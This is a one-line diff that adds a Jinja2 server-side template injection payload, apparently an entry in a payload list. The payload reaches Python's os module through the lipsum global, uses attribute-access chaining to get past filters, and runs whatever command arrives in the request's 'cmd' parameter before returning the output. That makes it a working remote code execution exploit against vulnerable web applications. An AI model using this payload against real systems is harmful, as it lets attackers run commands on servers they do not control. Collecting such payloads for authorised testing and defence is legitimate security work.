@@ -1,0 +1,1 @@
+`{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')(request.args.get('cmd'))|attr('read')()}}`
